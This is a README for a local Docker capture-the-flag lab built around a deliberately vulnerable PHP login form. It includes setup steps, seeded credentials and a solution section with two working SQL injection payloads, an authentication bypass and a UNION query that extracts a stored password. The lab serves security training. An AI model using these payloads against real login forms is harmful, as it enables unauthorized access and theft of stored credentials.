# SQL Injection CTF - README

## Overview
This Capture The Flag (CTF) challenge is designed to help participants practice SQL Injection attacks on a vulnerable login form.

## Prerequisites
Before setting up the challenge, ensure you have the following installed on your system:
- Docker
- Docker Compose

## Setting Up the Challenge
1. **Clone the Repository (or create the project folder)**
   ```sh
   git clone <repository-url>
   cd SQLInjectCTF
   ```

2. **Ensure the following files exist in your project directory:**
   - `docker-compose.yml`
   - `Dockerfile`
   - `src/index.php`
   - `init.sql`

3. **Start the CTF environment using Docker**
   ```sh
   docker-compose up --build
   ```
   This will build and start both the web server and the database container.

4. **Access the Web Interface**
   - Open a browser and go to `http://localhost:8080`
   - You should see a simple login page.

## Setting Up the Database Manually (if needed)
If the database does not initialize correctly, manually access MySQL and set up the `users` table:

1. Open a new terminal and connect to the MySQL container:
   ```sh
   docker exec -it sqlinjectctf-db-1 mysql -u root -prootroot
   ```

2. Select the database:
   ```sql
   USE sqli_ctf;
   ```

3. Verify the table exists:
   ```sql
   SHOW TABLES;
   ```

4. If the `users` table does not exist, create it manually:
   ```sql
   CREATE TABLE users (
       id INT AUTO_INCREMENT PRIMARY KEY,
       username VARCHAR(255) NOT NULL,
       password VARCHAR(255) NOT NULL
   );
   
   INSERT INTO users (username, password) VALUES ('admin', 'password123');
   INSERT INTO users (username, password) VALUES ('flaguser', 'flag{sql_injection_success}');
   ```

## Solving the Challenge
1. **Bypass Authentication**
   - Enter the following payload in the **Username** field:
     ```
     ' OR '1'='1' --  
     ```
   - Leave the **Password** field blank.
   - Click **Login** and you should be authenticated as the first user.

2. **Extract the Flag**
   - Enter the following payload in the **Username** field:
     ```
     ' UNION SELECT 1, 'flaguser', password FROM users WHERE username='flaguser' --  
     ```
   - Leave the **Password** field blank.
   - Click **Login** and you should see:
     ```
     Password: flag{sql_injection_success}
     ```

## Cleanup
To stop and remove the Docker containers:
```sh
docker-compose down
```

Now you’re ready to practice SQL injection attacks in a controlled environment. Have fun hacking responsibly!

